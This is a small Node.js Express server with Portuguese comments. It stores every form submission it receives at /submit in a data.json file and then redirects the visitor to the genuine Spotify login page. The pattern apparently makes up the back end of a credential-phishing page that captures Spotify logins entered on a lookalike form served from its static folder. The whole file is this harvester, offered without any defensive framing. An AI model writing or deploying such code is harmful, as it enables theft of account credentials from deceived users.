const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;  // Usar a porta fornecida pelo serviço de hospedagem ou 3000

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));  // Servir arquivos estáticos se necessário

// Endpoint para receber dados do formulário
app.post('/submit', (req, res) => {
  const formData = req.body;

  // Armazenar os dados em um arquivo JSON
  const filePath = path.join(__dirname, 'data.json');
  fs.appendFile(filePath, JSON.stringify(formData) + '\n', (err) => {
    if (err) throw err;
    console.log('Dados salvos');
  });

  // Redirecionar para a página de login do Spotify
  res.redirect('https://accounts.spotify.com/login');
});

// Iniciar o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
